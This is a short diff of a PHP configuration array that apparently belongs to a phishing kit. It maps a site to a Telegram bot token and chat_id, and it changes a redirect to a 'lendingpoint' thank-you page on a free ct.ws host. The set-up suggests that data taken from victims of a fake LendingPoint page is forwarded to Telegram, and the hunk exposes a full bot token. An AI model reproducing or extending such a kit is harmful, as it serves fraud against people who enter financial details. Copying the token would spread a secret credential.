@@ -10,7 +10,7 @@ $site_map = [
             ['token' => '6304581861:AAGcg6NEHDa53yh9gIr_744so-hVPB-nFxk', 'chat_id' => '5539028238']
 
         ],
-        'redirect' => 'https://lendingpoint.ct.ws/lendingpoint/thankyou.html'
+        'redirect' => 'https://lendingpoint.ct.ws/cache_site/lendingpoint/thankyou.html'
     ],
     'site2.com' => [
         'bots' => [
